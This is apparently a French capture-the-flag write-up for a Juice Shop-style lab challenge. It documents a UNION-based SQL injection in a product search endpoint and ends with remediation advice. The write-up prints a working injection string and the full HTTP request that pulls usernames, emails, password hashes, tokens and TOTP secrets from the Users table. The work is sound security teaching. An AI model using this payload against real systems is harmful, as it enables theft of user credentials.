# User Credentials

> **Category :** Injection  
> **Difficulty :** 3  

## Methodology

1. **Recherche de faille**
   - Technique : Énumération, Test d'injection
   - Outil : BurpSuite (Proxy, Interceptor, Repeater)
   - Description : Interception des requêtes via BurpSuite pour analyser le endpoint de recherche `/rest/products/search?q=`. Test avec `apple'` pour vérifier la vulnérabilité à l'injection SQL.

2. **Récupération du schéma de la base**
   - Technique : Injection SQL (UNION-based)
   - Outil : BurpSuite
   - Description : Utilisation de l'injection `Database Schema` pour récupérer la structure de la table Users et identifier les noms des colonnes.

3. **Exploitation de la faille**
   - Technique : Injection SQL (UNION-based)
   - Outil : BurpSuite (Repeater)
   - Description : Injection d'une requête UNION SELECT pour extraire les données de la table Users (id, username, email, password, role, etc.).

| Partie | Rôle |
|--------|------|
| `apple'))` | Ferme la requête originale (chaîne + doubles parenthèses) |
| `UNION ALL SELECT` | Ajoute une nouvelle requête SELECT à la requête originale |
| `id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret` | Sélectionne les colonnes sensibles de la table Users |
| `FROM Users` | Cible la table contenant les identifiants utilisateurs |
| `--` | Commente le reste de la requête originale |

## Vulnerabilities

**Vulnerability :** Injection SQL - Exfiltration de données utilisateurs

**Components :** Base de données, Système de recherche de produits

**Severity level :** Critique

## Risks

- Exfiltration massive de données sensibles (emails, mots de passe hashés, tokens, secrets TOTP)
- Énumération complète de la structure de la base de données
- Contournement de l'authentification via extraction des identifiants administrateur
- Prise de contrôle totale de l'application
- Compromission des comptes utilisateurs sur d'autres plateformes (réutilisation de mots de passe)

## Actions

**Risks mitigation strategies :**
- Appliquer le principe du moindre privilège pour le compte de base de données
- Implémenter une validation stricte des entrées utilisateur (longueur, caractères autorisés)
- Hasher les mots de passe avec des algorithmes forts (Argon2, bcrypt)

**Remediation fixes :**
Utiliser des requêtes paramétrées (Prepared Statements) :
```javascript
const query = "SELECT * FROM Products WHERE name LIKE ?";
db.all(query, ['%' + req.query.q + '%'], callback);
```

**Security practice :**
- Ne jamais concaténer les entrées utilisateur dans les requêtes SQL
- Effectuer des tests de pénétration réguliers sur les fonctionnalités de recherche
- Chiffrer les données sensibles au repos
- Implémenter une détection d'intrusion pour les patterns d'injection SQL

## Evidences and artifacts

**Users Table Schema :**
```sql
CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255), `email` VARCHAR(255), `password` VARCHAR(255), `role` VARCHAR(255), `deluxeToken` VARCHAR(255), `lastLoginIp` VARCHAR(255), `profileImage` VARCHAR(255), `totpSecret` VARCHAR(255), ...)
```

**Request :**
```http
GET /rest/products/search?q=apple'))%20UNION%20ALL%20SELECT%20id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret%20FROM%20Users-- HTTP/2
Host: ctf.juice.cyber.epitest.eu
```
